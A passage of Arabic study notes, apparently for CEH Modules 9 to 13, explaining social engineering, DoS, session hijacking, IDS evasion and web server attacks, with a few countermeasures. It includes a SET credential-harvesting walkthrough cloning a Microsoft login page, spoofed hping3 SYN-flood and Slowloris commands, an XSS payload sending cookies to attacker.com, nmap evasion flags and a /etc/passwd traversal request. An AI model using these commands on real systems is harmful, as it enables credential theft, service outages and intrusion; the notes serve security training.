لو كان الموقع يستخدم HTTPS، لن يستفيد المهاجم من التنصت العادي. لذلك يستخدم تقنية SSL Stripping التي تعمل كوكيل (Proxy). عندما تطلب الضحية موقعاً، يقوم المهاجم بفتح اتصال HTTPS آمن بينه وبين الخادم، ولكنه يعطي للضحية نسخة HTTP (غير مشفرة) من الموقع. الضحية يكتب الباسورد في الـ HTTP، يسرقه المهاجم، ثم يرسله مشفراً للخادم لتجنب إثارة الشبهات.

🎭 CEH Module 9: Social Engineering

الهندسة الاجتماعية: اختراق العقول بدلاً من الأنظمة

🔴 Critical Risk 🔧 SET · GoPhish · Evilginx2
📖 ما هي الهندسة الاجتماعية؟

هي فن التلاعب بالأشخاص لجعلهم يقومون بأفعال معينة أو إفشاء معلومات سرية. مهما كان الـ Firewall أو الانتي فايروس قوياً، يمكن لمكالمة هاتفية واحدة أو إيميل مزيف أن يعطي المهاجم صلاحيات كاملة على النظام.

🎯 لماذا تُعتبر خطيرة؟

لأنها تستهدف "العنصر البشري"، وهو الحلقة الأضعف في أي نظام أمني. المخترق لا يحتاج للبحث عن ثغرة Zero-Day معقدة، بل يبحث عن موظف ساذج أو خائف أو متعاون.

سيكولوجية الاستهداف (لماذا تنجح؟)

تعتمد هجمات الهندسة الاجتماعية على استغلال المشاعر الإنسانية الأساسية:

├── 📂 الخوف / الاستعجال (Urgency): "حسابك سيتم إغلاقه خلال 24 ساعة إذا لم تؤكد بياناتك".
├── 📜 السلطة (Authority): انتحال شخصية المدير التنفيذي (CEO) أو جهة حكومية.
├── 🧬 الثقة (Trust): التظاهر كزميل عمل من قسم الـ IT يعرض المساعدة.
├── 🕸️ الفضول (Curiosity): إرسال ملف بعنوان "كشوفات رواتب الموظفين 2024".
└── 🎛️ الجشع (Greed): إيهام الضحية بربح جائزة مالية.

أنواع الهندسة الاجتماعية (تصنيف مفصل)

1. Human-Based (الهجمات المعتمدة على التفاعل البشري المباشر)

├── 📂 Impersonation (انتحال الشخصية): يتظاهر المهاجم بأنه فني صيانة إنترنت، عامل نظافة، أو موظف جديد ليدخل المبنى ويبدأ في زرع أجهزة أو سرقة أوراق.
├── 📜 Tailgating / Piggybacking: الانتظار عند الباب المؤمن ببطاقة دخول، وعندما يفتح موظف الباب، يدخل المهاجم خلفه مباشرة بحجة أنه نسي بطاقته (أو يحمل صندوقاً ثقيلاً).
├── 🧬 Dumpster Diving: النزول حرفياً للبحث في سلة مهملات الشركة! الموظفون يتخلصون من جداول المواعيد، كلمات المرور المكتوبة على ورق (Sticky Notes)، ومخططات الشبكة بدون تمزيقها (Shredding).
├── 🕸️ Shoulder Surfing: استراق النظر لشاشة الضحية في الكافيهات أو المواصلات أثناء كتابة كلمة المرور.
└── 🎛️ Eavesdropping: التنصت على محادثات الموظفين السرية في الأماكن العامة.

2. Computer-Based (الهجمات المعتمدة على الأجهزة)

├── 📂 Phishing (التصيد الاحتيالي): إرسال آلاف الإيميلات المزيفة عشوائياً تبدو كأنها من بنك أو فيسبوك.
├── 📜 Spear Phishing (التصيد الموجه): تصيد دقيق جداً! المهاجم يجمع معلومات عن موظف محدد (اسمه، وظيفته، اسم مديره) ويرسل له إيميلاً مخصصاً بنسبة نجاح عالية جداً.
├── 🧬 Whaling (صيد الحيتان): Spear Phishing موجه لشخصية ذات منصب عالي جداً (مثل CEO أو CFO). غالباً يكون الهجوم أكثر تعقيداً واحترافية.
├── 🕸️ Baiting (الاصطياد): المهاجم يترك فلاشة USB مصابة بفيروس في جراج الشركة مكتوب عليها "رواتب 2024". الموظف سيأخذها الفضول لفتحها على جهازه في الشركة.
└── 🎛️ Watering Hole (حفرة الماء): بدلاً من مهاجمة الشركة مباشرة (حمايتها قوية)، يقوم المهاجم باختراق موقع ويب عادي (مثلاً موقع يطلب منه الموظفون وجبات الغداء) ويزرع فيه Malware ليصيب الموظفين عند زيارتهم له.

3. Mobile & Voice-Based

├── 📂 Vishing (Voice Phishing): مكالمة هاتفية، المهاجم يدعي أنه موظف البنك ويطلب الـ OTP.
└── 📜 Smishing (SMS Phishing): إرسال رسالة نصية قصيرة تحتوي على رابط خبيث (مثل: "طردك من البريد محتجز، ادفع الرسوم عبر الرابط").

التطبيق العملي: إطار عمل SET

تُعتبر أداة Social-Engineer Toolkit (SET) الأداة الرسمية في منهج CEH لاختبار هذه الهجمات. تتيح استنساخ أي موقع ويب في ثوانٍ لاستقبال بيانات الضحايا.

خطوات عمل Site Cloner و Credential Harvester
# 1. Start SET as root
sudo setoolkit

# 2. Select Social-Engineering Attacks
> 1

# 3. Select Website Attack Vectors
> 2

# 4. Select Credential Harvester Attack Method
> 3

# 5. Select Site Cloner
> 2

# 6. Enter the IP address for the reverse connection (Your IP)
> 192.168.1.100

# 7. Enter the URL to clone
> https://login.microsoftonline.com

# Tool will start an Apache server. When victim visits 192.168.1.100, 
# they see the exact Microsoft login page. Passwords entered are logged in plaintext!

هجمات متقدمة: تجاوز المصادقة الثنائية (MFA Bypass)

الـ Phishing التقليدي يفشل إذا كانت الضحية تستخدم 2FA أو MFA. لذلك ظهرت أدوات مثل Evilginx2. هي تعمل كـ (Reverse Proxy) حقيقي بين الضحية والسيرفر الحقيقي. عندما تدخل الضحية كود الـ OTP، يقوم Evilginx2 بتمريره للسيرفر، ثم يسرق الـ Session Cookie الجاهز الذي يمنحه السيرفر للمستخدم. باستخدام هذا الكوكي، يمكن للمهاجم الدخول للحساب مباشرة بدون الحاجة للباسورد أو الـ OTP!

💣 CEH Module 10: Denial of Service (DoS & DDoS)

الدليل الشامل لإسقاط الخدمات، استنزاف الموارد، وشبكات البوت نت

🟡 Medium Risk 🔧 hping3 · Slowloris · LOIC
📖 ما هو الـ DoS / DDoS؟

DoS (Denial of Service): هجوم ينفذه جهاز واحد ضد خادم واحد بهدف استنزاف موارده (المعالج، الرامات، أو الباندويث) حتى يسقط ولا يستجيب للمستخدمين الشرعيين.
DDoS (Distributed DoS): هجوم تنفذه آلاف الأجهزة (Botnet) في نفس الوقت ضد الهدف، مما يجعله مدمراً وأصعب بكثير في الصد والتتبع.

🎯 تأثير الهجوم

خسائر مالية ضخمة للشركات، توقف الخدمات الحرجة، وقد يُستخدم الهجوم كتمويه (Smokescreen) لإشغال فريق الحماية (SOC) بينما يقوم المهاجم باختراق قاعدة البيانات من جهة أخرى.

تصنيفات هجمات حجب الخدمة (Attack Categories)

1. Volumetric Attacks (هجمات الباندويث)

الهدف هو خنق سعة الاتصال (Bandwidth) الخاصة بالخادم. الهجوم يُقاس بـ Bits per second (Bps).
أمثلة: UDP Flood، ICMP Flood (Ping Flood). يقوم المهاجم بإرسال ملايين الحزم الضخمة، فيمتلئ الخط الخاص بالسيرفر ولا يوجد مساحة للطلبات الشرعية.

2. Protocol Attacks (هجمات البروتوكول / الشبكة)

تستهدف إنهاك أجهزة البنية التحتية مثل الـ Firewalls، الـ Load Balancers، أو موارد نظام التشغيل عن طريق استغلال نقاط ضعف في بروتوكولات الطبقة الثالثة والرابعة (Layer 3/4). يُقاس بـ Packets per second (Pps).
أمثلة:
- SYN Flood: استغلال المصافحة الثلاثية (3-Way Handshake) للـ TCP. المهاجم يرسل حزمة SYN، السيرفر يرد بـ SYN-ACK وينتظر الـ ACK ليفتح الجلسة في الرامات (Half-open connection). المهاجم لا يرسل الـ ACK أبداً، ويرسل ملايين الـ SYN الأخرى حتى تمتلئ رامات السيرفر ويسقط!
- Smurf Attack: إرسال ICMP (Ping) مزور يحمل IP الضحية إلى عنوان Broadcast في شبكة كبيرة، فتقوم كل الأجهزة في تلك الشبكة بالرد على الضحية في نفس الوقت!

3. Application Layer Attacks (هجمات طبقة التطبيقات)

أخطر وأذكى أنواع الهجمات! تبدو كأنها حركة مرور شرعية تماماً، ولا تحتاج باندويث ضخم. تستهدف الطبقة السابعة (Layer 7) لاستنزاف معالج الخادم. تُقاس بـ Requests per second (Rps).
أمثلة:
- HTTP GET/POST Flood: إرسال طلبات للصفحات الثقيلة أو عمليات بحث ترهق قاعدة البيانات بشكل متكرر.
- Slowloris Attack: المهاجم يفتح اتصالات HTTP كثيرة مع الخادم، ولكنه يرسل الطلب ببطء شديد جداً (حرفاً واحداً كل 10 ثوانٍ). الخادم يبقى منتظراً اكتمال الطلب، ويظل يفتح اتصالات جديدة حتى يستنفد الحد الأقصى للاتصالات (Max Connections) ويسقط، وكل هذا يحدث باستخدام كمية ضئيلة جداً من الإنترنت من جهاز المهاجم!

DDoS Amplification (هجمات التضخيم الانعكاسي)

أشرس أنواع הـ DDoS وأكثرها قدرة تدميرية. تعتمد على فكرتين:

  1. Reflection (الانعكاس): المهاجم يزور عنوان الـ IP الخاص به (IP Spoofing) ويجعله نفس IP الضحية، ثم يرسل الطلب لخادم عام على الإنترنت. الخادم العام سيرد على הـ IP המزور (الضحية) بدلاً من المهاجم.
  2. Amplification (التضخيم): المهاجم يبحث عن خدمات يكون الرد فيها أضعاف أضعاف حجم الطلب. يرسل المهاجم طلباً بحجم 10 بايت، فيقوم الخادم بالرد على الضحية بملف حجمه 500 بايت (تضخيم 50 ضعفاً!).

أشهر الخوادم المستخدمة: - DNS Amplification: يطلب المهاجم سجل (ANY) واسع النطاق. نسبة التضخيم تصل لـ 54x. - NTP Amplification: استخدام أمر `monlist` الذي يعيد قائمة بآخر 600 جهاز اتصل بالخادم. نسبة التضخيم تصل لـ 556x. - Memcached Amplification: الأسوأ على الإطلاق! نسبة تضخيم وصلت في بعض الهجمات لـ 51,000x!

تطبيق عملي: أوامر ومحاكاة

استخدام hping3 لعمل SYN Flood احترافي (عبر تزوير مصدر الـ IPs عشوائياً)
hping3 -S --flood --rand-source -p 80 <Target_IP>

شرح الأمر:
-S: إرسال حزم SYN فقط.
--flood: إرسال الحزم بأقصى سرعة ممكنة دون انتظار الرد.
--rand-source: كل حزمة تخرج بـ IP مصدر عشوائي لتجاوز الفلترة.
-p 80: استهداف منفذ الويب.

استخدام Slowloris لإسقاط خادم Apache (Application Layer)
slowloris <Target_IP> -s 500

يقوم بفتح 500 اتصال والحفاظ عليها مفتوحة أطول فترة ممكنة عبر إرسال ترويسات جزئية.

🔓 CEH Module 11: Session Hijacking

كيفية اختطاف هويات المستخدمين بعد تسجيل الدخول الشرعي

🔴 High Risk 🔧 Burp Suite · OWASP ZAP
📖 ما هو اختطاف الجلسات؟

بعد قيام المستخدم بكتابة اليوزر والباسورد بنجاح، يقوم الخادم بإنشاء "جلسة" (Session) ويعطيه معرّف فريد (Session ID/Cookie). اختطاف الجلسة يعني أن يقوم المهاجم بسرقة هذا المعرف واستخدامه ليدخل الخادم بحساب المستخدم دون أن يعرف كلمة المرور.

🎯 مستويات الهجوم

يمكن أن يتم ההجوم على مستوى الشبكة (Network Level) لاختطاف اتصالات TCP حية، أو على مستوى التطبيقات (Application Level) لاختطاف جلسات الويب.

Network Level Hijacking (اختطاف جلسات TCP)

في هذا الهجوم، المهاجم يعترض اتصال قائم بين الضحية والخادم (مثلاً اتصال Telnet أو FTP).

├── 📂 Blind Hijacking: المهاجم يرسل أوامر للخادم منتحلاً شخصية الضحية، لكنه أعمى (لا يرى رد الخادم لأن الرد يذهب للضحية الحقيقية). يتطلب توقع أرقام Sequence Numbers.
└── 📜 Active Hijacking (RST/Hijack): يقوم المهاجم بإسقاط الضحية من الاتصال عبر إرسال حزمة TCP RST (Reset)، ثم يتولى هو استكمال جلسة הـ TCP مع الخادم، مما يجعله يتحكم تحكماً كاملاً بالجلسة ويتلقى الردود.

Application Level Hijacking (اختطاف جلسات الويب)

هذا النوع هو الأكثر شيوعاً في اختراق المواقع (Web Hacking). يتم عبر عدة أساليب لسرقة الـ Session ID:

1. Session Sniffing (التقاط الكوكيز من الشبكة)

إذا كان الموقع لا يستخدم HTTPS، أو تم تطبيق هجوم SSL Stripping، يمكن للمهاجم عبر Wireshark التقاط حزمة HTTP ورؤية الترويسة Cookie: session_id=XYZ123 بوضوح.

2. Session Fixation (تثبيت الجلسة)

هجوم خبيث جداً! المهاجم لا يسرق جلسة الضحية، بل يُجبر הضحية على استخدام جلسة يمتلكها المهاجم.
الخطوات: 1. المهاجم يدخل موقع البنك كزائر عادي ويأخذ `Session ID = 123`. 2. يرسل المهاجم رابطاً للضحية: `http://bank.com/login?sessionid=123`. 3. الضحية تضغط على الرابط وتقوم بتسجيل الدخول الفعلي في حسابها. 4. الخادم الآن يربط حساب الضحية بالجلسة `123`. 5. المهاجم يعود لمتصفحه الذي يحتوي أساساً على הגلسة `123` ويجد نفسه داخل حساب הضحية!

3. Cross-Site Scripting (XSS)

أشهر طريقة لسرقة الكوكيز. المهاجم يجد ثغرة XSS في الموقع ويحقن كود جافاسكريبت. عندما يزور הضحية الصفحة المصابة، يعمل الكود ويسرق الكوكي ويرسله لخادم المهاجم.

مثال لـ Payload سرقة الكوكيز عبر XSS
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

إجراءات الحماية المضادة (Countermeasures)

├── 📂 HttpOnly Flag: تمنع الجافاسكريبت من الوصول للـ Cookies (تقتل هجوم הـ XSS المتعلق بالجلستات).
├── 📜 Secure Flag: تجبر المتصفح على إرسال الـ Cookies عبر HTTPS فقط (تمنع Session Sniffing).
├── 🧬 تجديد الجلسة (Session Regeneration): يجب على الخادم تغيير معرّف الجلسة (Session ID) فور تسجيل الدخول بنجاح لمنع هجوم הـ Session Fixation.
└── 🕸️ ربط الجلسة بخصائص المستخدم: ربط הـ Session بالـ IP الخاص بالمستخدم والـ User-Agent (متصفحه). إذا حاول المهاجم استخدام الكوكي من IP أو جهاز مختلف، يتم رفضه.

🛡️ CEH Module 12: Evading IDS, Firewalls & Honeypots

فنون التخفي وتجاوز أنظمة الكشف المعقدة أثناء الاختراق

🔴 High Risk 🔧 Nmap · Ncat · Proxychains
📖 تشريح أنظمة الحماية

Firewall: يعمل كحارس أمن، ينظر إلى الـ IP والمنفذ ويسمح أو يمنع (Block/Allow).
IDS (Intrusion Detection): يعمل ككاميرات المراقبة والانذار، يحلل محتوى البيانات ليكتشف الهجمات وينذر الإدارة.
IPS (Intrusion Prevention): كاميرا مراقبة مسلحة، يكتشف الهجوم ويقطعه فوراً.

🎯 آليات كشف IDS

إما Signature-Based (يبحث عن بصمات برمجيات معروفة، مثل الانتي فايروس)، أو Anomaly-Based (يبني خط أساس "Baseline" للسلوك الطبيعي، وإذا زاد الترافيك فجأة يعطي إنذار).

طرق التخفي وتجاوز الجدران (Evasion Techniques)

1. تجزئة الحزم (Packet Fragmentation)

الـ IDS يعتمد على قراءة الـ Signature الكاملة في الحزمة (مثلاً كلمة /etc/passwd). لكي نخدعه، نقوم بتجزئة هذه الكلمة عبر عدة حزم صغيرة (IP Fragments). الحزمة الأولى تحمل /et والثانية c/p والثالثة asswd. الـ IDS لن يجد البصمة الكاملة فيمرر الحزم، ويقوم جهاز הضحية بإعادة تجميعها وقراءتها كاملة!

Nmap Fragmentation
nmap -f <Target_IP>       # Fragment packets into 8 bytes
nmap -ff <Target_IP>      # Fragment into 16 bytes
nmap --mtu 24 <Target_IP> # Custom MTU size

2. استخدام الشراك الخداعية (Decoy Scanning)

كيف تخفي مصدرك الحقيقي أثناء الفحص (Scanning)؟ تقوم بإرسال حزم الفحص من عنوان IP الخاص بك، وإرسال نفس الحزم في نفس الوقت من 10 عناوين IP عشوائية أخرى ومزيفة. مسؤول الحماية سيرى 11 جهازاً يقومون بهجوم، ولن يعرف من هو المهاجم الحقيقي.

Nmap Decoys
nmap -D RND:10 <Target_IP>  # Generates 10 random decoy IPs + your real IP

3. التلاعب بمصدر المنفذ (Source Port Manipulation)

بعض إعدادات الـ Firewalls تكون خاطئة وتسمح بمرور الترافيك إذا كان قادماً من منفذ موثوق، مثل منفذ الـ DNS (53) أو HTTP (80).

Nmap Source Port
nmap -g 53 <Target_IP>   # Make scans originate from Port 53

4. تشويش الهجوم وإضافة بيانات زائدة (Data Append/Padding)

الـ Firewalls المتقدمة قد تشك في الحزم الفارغة تماماً. يمكنك إرفاق بيانات عشوائية لجعل الحزم تبدو طبيعية.

nmap --data-length 50 <Target_IP>   # Append 50 random bytes to packets

Honeypots (أفخاخ العسل)

هي أجهزة أو سيرفرات وهمية تزرعها الشركات كفخ للمخترقين. تبدو مليئة بالثغرات الجذابة السهلة لاستدراجك. بمجرد اتصالك بها، تقوم بتسجيل كل حركاتك وأدواتك، وتعطي إنذاراً للفريق الأمني.
أنواعها: - Low-Interaction: برامج بسيطة تفتح بورتات وهمية (مثل 22) وتخزن محاولات تسجيل הדخول (مثل Honeyd, KFSensor). - High-Interaction: أنظمة تشغيل كاملة ومعقدة، يمكن للمخترق اختراقها فعلياً، ولكنها في شبكة معزولة مراقبة بالكامل.
كيف تكتشفها؟ إذا وجدت سيرفراً كل منافذه (1 إلى 65535) مفتوحة وتستجيب، أو استجابات الخدمات (Banners) متطابقة أو بطيئة بشكل غريب، فأنت على الأغلب في פخ!

🌐 CEH Module 13: Hacking Web Servers

استهداف البنية التحتية، إعدادات الخوادم، واستغلال أخطاء الإدارة

🟡 Medium Risk 🔧 Nikto · DirBuster · Uniscan
📖 Web Servers vs Web Apps

يجب التمييز: اختراق تطبيقات الويب (Web Apps) يركز على الكود الذي كتبه المبرمج (XSS, SQLi). أما اختراق خوادم الويب (Web Servers) يركز على البرنامج الذي يستضيف الموقع نفسه (Apache, Nginx, Microsoft IIS) وإعداداته والثغرات في الـ Modules الخاصة به.

🎯 منهجية الاستهداف

تبدأ בجمع المعلومات (Information Gathering)، فحص المنافذ والخدمات، قراءة الـ Banners (التي تفضح إصدار السيرفر)، فحص الثغرات باستخدام أدوات زي Nikto، ثم الاستغلال للوصول للملفات أو تنفيذ الأوامر.

أبرز الهجمات على خوادم الويب

1. Directory Traversal (Path Traversal)

تحدث عندما لا يفرض خادم الويب قيوداً صارمة على المجلد الجذري (Web Root). يمكن للمهاجم استخدام رموز الصعود ../ للخروج من مجلد الموقع والوصول لملفات النظام الحساسة.

مثال لطلب خبيث
GET /images/../../../etc/passwd HTTP/1.1

2. Web Server Misconfiguration (أخطاء الإعداد)

أكثر الثغرات شيوعاً في الخوادم! تحدث بسبب كسل مدير النظام أو ترك الإعدادات الافتراضية:

├── 📂 Directory Listing: السماح بعرض محتويات المجلد إذا غاب ملف `index.html`. المهاجم قد يرى مجلدات الـ Backups، الأكواد، أو ملفات الـ Config.
├── 📜 Default Pages: ترك صفحات الديفولت (مثل صفحة Apache Tomcat الافتراضية) التي تحتوي على رابط للـ Manager App وكلمات المرور الافتراضية.
└── 🧬 Verbose Error Messages: عرض رسائل خطأ تفصيلية تكشف إصدار قاعدة البيانات والمسارات الحقيقية في السيرفر.

3. HTTP Verb Tampering

بروتوكول HTTP يحتوي على دوال متعددة (GET, POST, OPTIONS, PUT, DELETE, TRACE). خوادم الويب القديمة أو سيئة الإعداد قد تترك دوال خطيرة مفعلة. على سبيل المثال، تفعيل الدالة PUT يسمح للمهاجم برفع ملفات مباشرة للسيرفر (كأنه يرفع Web Shell). وتفعيل TRACE يتيح هجوم Cross-Site Tracing (XST) لسرقة الكوكيز متجاوزاً HttpOnly.

4. HTTP Response Splitting

هجوم يعتمد على إدخال أحرف نهاية السطر CRLF (%0d%0a) في مدخلات المستخدم التي يعكسها الخادم في الترويسة (Header). يتيح للمهاجم شطر استجابة הـ HTTP إلى استجابتين، مما يمكنه من تسميم الكاش (Cache Poisoning) أو تنفيذ XSS من نوع خاص.

أدوات فحص خوادم الويب الأساسية

nikto -h http://target.com
